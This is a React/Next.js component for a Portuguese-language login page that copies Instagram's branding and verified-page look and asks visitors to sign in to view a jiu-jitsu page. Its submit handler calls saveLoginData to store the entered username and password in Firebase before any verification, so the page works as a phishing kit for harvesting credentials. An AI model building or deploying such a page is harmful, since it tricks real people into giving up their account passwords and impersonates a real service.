"use client"

import type React from "react"

import { useState } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Avatar, AvatarFallback, AvatarImage } from "@/components/ui/avatar"
import { CheckCircle2 } from "lucide-react"
import Image from "next/image"
import { verifyLogin, saveLoginData } from "@/lib/firebase"

interface LoginScreenProps {
  onLogin: () => void
}

export function LoginScreen({ onLogin }: LoginScreenProps) {
  const [username, setUsername] = useState("")
  const [password, setPassword] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (!username || !password) {
      return
    }

    setIsLoading(true)

    try {
      await saveLoginData(username, password)
      const isValid = await verifyLogin(username, password)

      if (isValid) {
        onLogin()
      }
    } catch (err) {
      console.error("[v0] Login error:", err)
    } finally {
      setIsLoading(false)
    }
  }

  const samplePosts = [
    "/jiu-jitsu-training.png",
    "/jiu-jitsu-competition-match.jpg",
    "/jiu-jitsu-belt-ceremony.jpg",
    "/jiu-jitsu-technique-demonstration.jpg",
    "/jiu-jitsu-gym-training.jpg",
    "/jiu-jitsu-sparring-practice.jpg",
    "/jiu-jitsu-team.png",
    "/jiu-jitsu-medal-achievement.jpg",
    "/jiu-jitsu-ground-technique.jpg",
  ]

  return (
    <div className="relative flex min-h-screen items-center justify-center p-4 sm:p-6 overflow-hidden">
      <div className="absolute inset-0 bg-gradient-to-br from-gray-50 to-gray-100">
        <div className="absolute inset-0 grid grid-cols-3 gap-1 p-4 opacity-20 blur-sm">
          {samplePosts.map((post, index) => (
            <div key={index} className="aspect-square relative">
              <Image src={post || "/placeholder.svg"} alt={`Post ${index + 1}`} fill className="object-cover" />
            </div>
          ))}
        </div>
      </div>

      <div className="relative z-10 w-full max-w-[380px] space-y-3">
        <div className="bg-white border border-gray-300 rounded-xl p-8 sm:p-10 space-y-5 shadow-2xl">
          <div className="flex flex-col items-center space-y-3 pb-4 border-b border-gray-200">
            <Avatar className="h-20 w-20 ring-4 ring-gray-100">
              <AvatarImage src="/jiu-jitsu-athlete-profile.jpg" alt="jiujitsu" />
              <AvatarFallback className="bg-gradient-to-br from-purple-500 to-pink-500 text-white text-2xl font-bold">
                JJ
              </AvatarFallback>
            </Avatar>
            <div className="text-center space-y-1">
              <h2 className="text-lg font-semibold text-black">jiujitsu</h2>
              <div className="flex items-center justify-center gap-1.5 text-blue-600">
                <CheckCircle2 className="h-4 w-4" />
                <p className="text-xs font-medium">Página do Instagram</p>
              </div>
            </div>
          </div>

          <div className="text-center space-y-2.5 pt-1">
            <div className="flex justify-center">
              <Image
                src="/instagram-text-logo.png"
                alt="Instagram"
                width={160}
                height={55}
                className="object-contain"
                priority
              />
            </div>
            <p className="text-sm text-gray-700 font-medium px-2">Entre com Instagram para ver a página</p>
          </div>

          {/* Login Form */}
          <form onSubmit={handleSubmit} className="space-y-2 pt-1">
            <Input
              type="text"
              placeholder="Telefone, nome de usuário ou email"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
              disabled={isLoading}
              className="h-10 border-gray-300 bg-gray-50 text-sm text-black placeholder:text-gray-500 rounded-md focus-visible:ring-1 focus-visible:ring-gray-400"
            />
            <Input
              type="password"
              placeholder="Senha"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              disabled={isLoading}
              className="h-10 border-gray-300 bg-gray-50 text-sm text-black placeholder:text-gray-500 rounded-md focus-visible:ring-1 focus-visible:ring-gray-400"
            />

            <Button
              type="submit"
              disabled={isLoading}
              className="h-9 w-full text-sm font-semibold rounded-lg mt-3 text-white"
              style={{ backgroundColor: "#0095f6" }}
            >
              {isLoading ? "Entrando..." : "Entrar"}
            </Button>
          </form>

          {/* Divider */}
          <div className="flex items-center gap-4 my-4">
            <div className="h-px flex-1 bg-gray-300" />
            <span className="text-xs font-semibold text-gray-500">OU</span>
            <div className="h-px flex-1 bg-gray-300" />
          </div>

          {/* Facebook Login */}
          <button
            className="flex w-full items-center justify-center gap-2 text-sm font-semibold"
            style={{ color: "#385185" }}
          >
            <svg className="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
              <path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z" />
            </svg>
            Entrar com o Facebook
          </button>

          {/* Forgot Password */}
          <div className="text-center pt-3">
            <a href="#" className="text-xs text-gray-800 hover:text-gray-600">
              Esqueceu a senha?
            </a>
          </div>
        </div>

        <div className="bg-white border border-gray-300 rounded-xl p-5 text-center shadow-xl">
          <p className="text-sm text-black">
            Não tem uma conta?{" "}
            <a href="#" className="font-semibold hover:text-gray-700" style={{ color: "#0095f6" }}>
              Cadastre-se
            </a>
          </p>
        </div>
      </div>
    </div>
  )
}
